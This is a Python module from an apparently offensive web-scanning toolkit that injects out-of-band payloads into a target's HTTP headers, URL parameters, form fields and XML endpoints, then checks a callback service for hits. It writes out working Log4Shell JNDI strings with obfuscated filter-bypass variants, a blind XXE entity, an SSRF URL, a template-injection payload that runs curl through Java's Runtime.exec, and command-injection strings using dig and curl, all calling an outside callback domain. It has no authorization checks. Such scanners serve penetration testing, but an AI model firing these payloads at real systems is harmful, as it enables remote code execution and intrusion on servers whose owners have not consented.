#!/usr/bin/env python3
"""
OOB (Out-of-Band) Tester — Real Implementation
------------------------------------------------
Uses the existing OOBDetector (oob_detector.py) for actual DNS/HTTP
callback tracking, instead of the mock implementation.

Covers:
  • Log4Shell / Log4j2 RCE (JNDI LDAP)
  • Blind SSRF via OOB
  • Blind XXE via OOB
  • SSTI with OOB callback
  • Command Injection with OOB DNS ping
"""

import time
import requests
from typing import List, Dict, Optional
from rich.console import Console

console = Console()


class OOBTester:
    """
    Out-of-Band vulnerability tester.
    Injects OOB payloads into headers, parameters, and body fields,
    then polls the OOBDetector for confirmed DNS/HTTP callbacks.
    """

    def __init__(self, target: str, session=None, timeout: int = 10):
        self.target = target.rstrip("/")
        self.timeout = timeout
        self.session = session or requests.Session()
        self.session.verify = False
        self.session.headers.setdefault("User-Agent", "WebPwnToolkit/2.2")
        self.results: List[Dict] = []

        # ── Real OOB detector ───────────────────────────────────────────
        try:
            from modules.web.oob_detector import OOBDetector

            self._oob = OOBDetector(timeout=timeout)
        except ImportError:
            self._oob = None

    # ── Build payloads from detector domain ─────────────────────────────

    def _build_payloads(self) -> dict:
        if self._oob and self._oob.available:
            domain = self._oob._domain
        else:
            domain = "webpwn-oob-test.interact.sh"

        return {
            "Log4Shell": f"${{jndi:ldap://{domain}/log4shell}}",
            "Log4Shell_upper": f"${{jndi:${{lower:l}}${{lower:d}}ap://{domain}/bypass}}",
            "Log4Shell_enc": f"${{${{::-j}}${{::-n}}${{::-d}}${{::-i}}:${{::-l}}${{::-d}}${{::-a}}${{::-p}}://{domain}/enc}}",
            "Blind SSRF": f"http://{domain}/ssrf",
            "Blind XXE": (
                f'<?xml version="1.0"?><!DOCTYPE r ['
                f'<!ELEMENT r ANY><!ENTITY % sp SYSTEM "http://{domain}/xxe">%sp;]><r/>'
            ),
            "SSTI OOB": f"${{T(java.lang.Runtime).getRuntime().exec('curl {domain}')}}",
            "CMDi OOB DNS": f"$(dig +short {domain})",
            "CMDi OOB curl": f"`curl http://{domain}/cmdi`",
        }

    # ── Inject into headers ─────────────────────────────────────────────

    def _inject_headers(self, payloads: dict) -> None:
        injectable_headers = [
            "User-Agent",
            "X-Forwarded-For",
            "X-Api-Version",
            "Referer",
            "Origin",
            "X-Custom-IP-Authorization",
            "Accept-Language",
            "CF-Connecting-IP",
            "X-Real-IP",
        ]

        for vtype, payload in payloads.items():
            headers = {h: payload for h in injectable_headers}
            try:
                self.session.get(
                    self.target,
                    headers=headers,
                    timeout=5,
                    verify=False,
                )
                console.print(
                    f"  [dim cyan][OOB] Injected '{vtype}' via headers[/dim cyan]"
                )
            except Exception:
                pass

    # ── Inject into URL parameters ──────────────────────────────────────

    def _inject_params(self, payloads: dict) -> None:
        injectable_params = [
            "url",
            "redirect",
            "uri",
            "path",
            "file",
            "img",
            "src",
            "host",
            "data",
            "fetch",
        ]
        for param in injectable_params:
            for vtype, payload in payloads.items():
                try:
                    self.session.get(
                        self.target,
                        params={param: payload},
                        timeout=5,
                        verify=False,
                    )
                except Exception:
                    pass
        console.print("  [dim cyan][OOB] URL parameter injection complete[/dim cyan]")

    # ── Inject into form bodies ─────────────────────────────────────────

    def _inject_form(self, payloads: dict) -> None:
        form_fields = [
            "email",
            "username",
            "message",
            "comment",
            "subject",
            "body",
            "url",
            "input",
        ]
        for vtype, payload in payloads.items():
            data = {f: payload for f in form_fields}
            try:
                self.session.post(
                    self.target,
                    data=data,
                    timeout=5,
                    verify=False,
                )
            except Exception:
                pass
        console.print("  [dim cyan][OOB] Form body injection complete[/dim cyan]")

    # ── Inject XXE into XML endpoints ───────────────────────────────────

    def _inject_xml(self, payloads: dict) -> None:
        xml_endpoints = ["/xml", "/api/xml", "/upload", "/import", "/api/parse"]
        xxe_payload = payloads.get("Blind XXE", "")
        for path in xml_endpoints:
            try:
                self.session.post(
                    self.target + path,
                    data=xxe_payload,
                    headers={"Content-Type": "application/xml"},
                    timeout=5,
                    verify=False,
                )
            except Exception:
                pass
        console.print("  [dim cyan][OOB] XML endpoint injection complete[/dim cyan]")

    # ── Public run ───────────────────────────────────────────────────────

    def inject_payloads(self) -> List[Dict]:
        if self._oob and not self._oob.available:
            console.print(
                "  [yellow]⚠  OOB listener unavailable — using mock domain[/yellow]"
            )

        payloads = self._build_payloads()
        domain = (
            self._oob._domain
            if (self._oob and self._oob.available)
            else "webpwn-oob-test.interact.sh"
        )

        console.print(f"  [bold cyan][OOB] Callback domain: {domain}[/bold cyan]")
        console.print(
            f"  [dim cyan][OOB] Injecting {len(payloads)} OOB payload types...[/dim cyan]"
        )

        # Inject across all vectors
        self._inject_headers(payloads)
        self._inject_params(payloads)
        self._inject_form(payloads)
        self._inject_xml(payloads)

        # Poll for interactions
        wait_secs = 6
        console.print(f"  [dim]Waiting {wait_secs}s for OOB callbacks...[/dim]")
        time.sleep(wait_secs)

        if self._oob and self._oob.available:
            events = self._oob.poll(wait=3)
            if events:
                for ev in events:
                    vuln_type = ev.get("type", "OOB Callback")
                    finding = self._oob.make_finding(
                        [ev],
                        f"OOB — {vuln_type} Confirmed",
                        self.target,
                        payloads.get(vuln_type, ""),
                        ev.get("source", "unknown"),
                    )
                    self.results.append(finding)
                console.print(
                    f"  [bold red]🔥 {len(events)} OOB callback(s) received![/bold red]"
                )
            else:
                console.print("  [dim]No OOB callbacks detected in this window[/dim]")
        else:
            console.print(
                "  [dim yellow][OOB] Real OOB listener not available. "
                "Deploy interactsh-client for confirmed blind vulnerability detection.[/dim yellow]"
            )

        color = "red" if self.results else "green"
        console.print(f"  [{color}]{len(self.results)} OOB confirmed issue(s)[/]")
        return self.results

    def run(self) -> List[Dict]:
        """Alias so it works uniformly with other scanner modules."""
        return self.inject_payloads()
